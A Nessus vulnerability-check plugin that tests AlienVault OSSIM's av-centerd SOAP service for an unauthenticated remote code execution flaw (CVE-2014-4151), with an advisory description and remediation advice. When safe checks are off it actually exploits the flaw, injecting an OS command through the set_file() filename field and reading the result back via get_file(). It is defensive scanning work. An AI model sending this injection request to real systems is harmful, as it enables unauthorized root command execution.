#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76215);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2014/06/25 21:29:53 $");

  script_cve_id("CVE-2014-4151");
  script_bugtraq_id(68018);
  script_osvdb_id(108021);

  script_name(english:"AlienVault OSSIM 'av-centerd' set_file() Remote Code Execution");
  script_summary(english:"Tries to exploit RCE via set_file().");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of AlienVault Open Source
Security Information Management (OSSIM) that is affected by a remote
code execution vulnerability in the 'av-centerd' SOAP service due to a
failure to sanitize user input to the 'set_file' method. A remote,
unauthenticated attacker can exploit this vulnerability to execute
arbitrary code with root privileges.

Note that this version is reportedly also affected by an additional
remote code execution vulnerability as well as an information
disclosure issue. However, Nessus did not test for these additional
issues.");
  script_set_attribute(attribute:"see_also", value:"http://forums.alienvault.com/discussion/2806");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-205/");
  script_set_attribute(attribute:"solution", value:"Upgrade to 4.8.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:alienvault:open_source_security_information_management");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014 Tenable Network Security, Inc.");

  script_dependencies("ossim_soap_detect.nbin");
  script_require_ports("www/AlienVault OSSIM 'av-centerd' SOAP Service");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("string.inc");

function _soap_create_request(tag, header, body, schema_year)
{
  local_var request;

  if (isnull(body))
    return NULL;

  if (isnull(schema_year))
    schema_year = "2001";

  if (isnull(tag))
    tag = "soapenv";

    request =
     '<?xml version="1.0" encoding="utf-8"?>
      <' + tag + ':Envelope ' + tag + ':encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:xsi="http://www.w3.org/' + schema_year + '/XMLSchema-instance"
        xmlns:' + tag + '="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsd="http://www.w3.org/' + schema_year + '/XMLSchema">';

  if (!isnull(header))
    request += '<' + tag + ':Header>' + header + '</' + tag + ':Header>';

  request +=
    '<' + tag + ':Body>' +
      body +
    '</' + tag + ':Body>
  </' + tag + ':Envelope>';

  return request;
}

function soap_send_request(soap_action, url, port, soap_tag, soap_header, request, headers, exit_on_fail)
{
  local_var result;

  if (isnull(soap_tag))
    soap_tag = "soapenv";

  if (isnull(headers))
  {
    headers = make_array(
      "Content-type", "application/soap+xml",
      "User-Agent", "Nessus SOAP v0.0.1 (Nessus.org)"
    );
  }

  headers["SOAPAction"] = soap_action;

  result = http_send_recv3(
      method       : "POST",
      item         : url,
      port         : port,
      add_headers  : headers,
      data         : _soap_create_request(tag:soap_tag, header:soap_header, body:request),
      exit_on_fail : exit_on_fail
  );

  return result;
}

app_name = "AlienVault OSSIM 'av-centerd' SOAP Service";
port = get_kb_item_or_exit('www/' + app_name);

method = 'set_file';
method_namespace = 'AV/CC/Util';
soap_action = strcat(method_namespace, '#', method);
url = "/av-centerd";
filename_output = '/tmp/output_of_id';   # We redirect the output of 'id' here.
filename_command = '/tmp/' + unixtime() + '_' + SCRIPT_NAME + ';id > ' + filename_output;

# First we check if the set_file() method exists. If it does and this
# is a paranoid check with safe checks enabled, we report there since
# I don't believe there are any non-vuln versions of this method.
request =
'<m:' + method + ' xmlns:m="' + method_namespace + '">
  <string>All</string>
  <string>423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</string>
  <string>' + unixtime() + '</string>
  <string>' + SCRIPT_NAME + '</string>
</m:' + method + '>';

soap_response =
  soap_send_request(
    soap_action:soap_action,
    url:url,
    port:port,
    request:request,
    exit_on_fail:TRUE);

if ('Failed to locate method' >< soap_response[2] || 'need a valid pathname' >!< soap_response[2])
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

if(safe_checks())
{
  if (report_paranoia > 1)
  {
    report =
      '\n' + 'Nessus reports this vulnerability based on the existence of' +
      '\n' + 'the set_file() method, which was removed in 4.8.0.' +
      '\n' + 'Use caution when testing without safe checks enabled.' +
      '\n';
    security_hole(port:port, extra:report);
    exit(0);
  }
  else exit(0, "Plugin exited because safe checks are enabled and scan is not paranoid.");
}

# If we got this far, safe checks are disabled and we can try direct
# exploitation, which creates two files in '/root'.
request =
'<m:' + method + ' xmlns:m="' + method_namespace + '">
  <string>All</string>
  <string>423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</string>
  <string>' + unixtime() + '</string>
  <string>' + SCRIPT_NAME + '</string>
  <string>' + filename_command + '</string>
</m:' + method + '>';

soap_response =
  soap_send_request(
    soap_action:soap_action,
    url:url,
    port:port,
    request:request,
    exit_on_fail:TRUE);

# Make sure the request was successful.
if ("Success" >!< soap_response[2])
  exit(1, "Unexpected response from SOAP server when calling set_file().");

# Save the last request for the report.
exploit_request = http_last_sent_request();

# Now we have to make a last request to get back the contents of the
# file that we redirected the output from 'id' into.
method = 'get_file';
soap_action = strcat(method_namespace, '#', method);

request =
  '<m:' + method + ' xmlns:m="' + method_namespace + '">
    <string>All</string>
    <string>423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</string>
    <string>' + unixtime() + '</string>
    <string>' + SCRIPT_NAME + '</string>
    <string>' + filename_output + '</string>
  </m:' + method + '>';

soap_response =
  soap_send_request(
    soap_action:soap_action,
    url:url,
    port:port,
    request:request,
    exit_on_fail:TRUE);

# Verify that 'id' command executed.
pattern = ">\s*(uid=.*)\s*</item";
match = eregmatch(string:soap_response[2], pattern:pattern);
if (isnull(match)) audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

if (report_verbosity > 0)
{
  report =
      '\n' + 'Nessus executed "id" by sending the following request :' +
      '\n' +
      '\n' + crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + 
      '\n' + chomp(exploit_request) + 
      '\n' + crap(data:'-', length:30) + " request " + crap(data:'-', length:30) +
      '\n' +
      '\n' + 'Which resulted in the following command output :' +
      '\n' +
      '\n' + match[1] +
      '\n' +
      '\n' + 'Nessus created two files on the remote host; please delete' +
      '\n' + 'them as soon as possible :' +
      '\n' +
      '\n' + '  ' + (filename_command - filename_output) +
      '\n' + '  ' + filename_output +
      '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
